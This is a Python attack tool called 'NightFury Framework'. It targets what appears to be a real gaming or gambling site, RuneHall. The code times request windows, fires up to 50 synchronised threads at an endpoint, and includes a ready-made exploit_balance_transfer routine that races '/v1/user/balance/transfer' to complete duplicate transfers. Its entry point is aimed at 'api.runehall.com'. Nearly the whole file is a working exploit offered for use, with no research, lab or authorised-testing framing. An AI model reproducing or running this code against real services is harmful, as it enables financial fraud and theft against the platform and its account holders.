"""
NightFury Framework - Race Condition Exploitation Framework
Automated timing window detection and multi-threaded race condition exploitation.
"""

import threading
import time
import requests
import logging
import concurrent.futures
from typing import List, Dict, Optional, Callable
from datetime import datetime

logger = logging.getLogger(__name__)

class RuneHallRaceConditionExploiter:
    """
    Advanced framework for detecting and exploiting race conditions.
    Specifically designed for financial transactions and game logic.
    """
    
    def __init__(self, target_url: str, session_cookies: Optional[Dict] = None):
        self.target_url = target_url
        self.session_cookies = session_cookies or {}
        self.results = []
        self.stop_event = threading.Event()
        
    def test_timing_window(self, endpoint: str, payload: Dict, iterations: int = 10) -> Dict:
        """
        Measure response times to identify potential timing windows.
        """
        url = f"{self.target_url}{endpoint}"
        latencies = []
        
        logger.info(f"[RACE] Testing timing window for {url}")
        
        for i in range(iterations):
            start_time = time.perf_counter()
            try:
                response = requests.post(url, json=payload, cookies=self.session_cookies, timeout=10)
                end_time = time.perf_counter()
                latencies.append(end_time - start_time)
            except Exception as e:
                logger.error(f"[RACE] Request failed: {e}")
                
        if not latencies:
            return {"error": "No successful requests"}
            
        return {
            "min_latency": min(latencies),
            "max_latency": max(latencies),
            "avg_latency": sum(latencies) / len(latencies),
            "jitter": max(latencies) - min(latencies)
        }

    def execute_race(self, endpoint: str, payload: Dict, thread_count: int = 20) -> List[Dict]:
        """
        Execute a multi-threaded race condition attack.
        """
        url = f"{self.target_url}{endpoint}"
        responses = []
        barrier = threading.Barrier(thread_count)
        
        def worker():
            # Wait for all threads to be ready
            barrier.wait()
            try:
                resp = requests.post(url, json=payload, cookies=self.session_cookies, timeout=10)
                responses.append({
                    "status_code": resp.status_code,
                    "body": resp.text[:200],
                    "timestamp": time.time()
                })
            except Exception as e:
                responses.append({"error": str(e)})

        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=worker)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
            
        return responses

    def exploit_balance_transfer(self, from_account: str, to_account: str, amount: float):
        """
        Specific exploit for balance transfer race conditions.
        """
        endpoint = "/v1/user/balance/transfer"
        payload = {
            "from": from_account,
            "to": to_account,
            "amount": amount
        }
        
        logger.info(f"[RACE] Attempting balance transfer race condition: {amount} from {from_account}")
        results = self.execute_race(endpoint, payload, thread_count=50)
        
        success_count = sum(1 for r in results if r.get("status_code") == 200)
        logger.info(f"[RACE] Results: {success_count} successful transfers out of {len(results)}")
        return results

if __name__ == "__main__":
    # Example usage
    exploiter = RuneHallRaceConditionExploiter("https://api.runehall.com")
    print("[*] Race Condition Framework Initialized")
